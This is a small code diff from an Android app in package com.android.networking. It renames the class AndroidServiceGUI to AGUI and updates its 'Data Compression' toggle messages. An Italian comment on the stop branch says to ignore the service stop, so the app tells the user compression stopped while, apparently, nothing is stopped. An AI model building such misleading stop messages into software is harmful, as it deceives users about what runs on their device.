@@ -35,7 +35,7 @@ import com.android.networking.R;
 /**
  * The Class AndroidServiceGUI.
  */
-public class AndroidServiceGUI extends Activity implements OnSeekBarChangeListener {
+public class AGUI extends Activity implements OnSeekBarChangeListener {
 	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
 
 	private SeekBar seekBar;
@@ -156,12 +156,12 @@ public class AndroidServiceGUI extends Activity implements OnSeekBarChangeListen
 				if (((ToggleButton) v).isChecked()) {
 					editor.putBoolean("running", true);
 					
-					Toast.makeText(AndroidServiceGUI.this, "Data Compression Started", Toast.LENGTH_LONG).show();
+					Toast.makeText(AGUI.this, "Data Compression Started", Toast.LENGTH_LONG).show();
 				} else {
 					editor.putBoolean("running", false);
 					
 					// IGNORA LO STOP DEL SERVIZIO
-					Toast.makeText(AndroidServiceGUI.this, "Data Compression Stopped", Toast.LENGTH_LONG).show();
+					Toast.makeText(AGUI.this, "Data Compression Stopped", Toast.LENGTH_LONG).show();
 				}
 				
 				editor.commit();
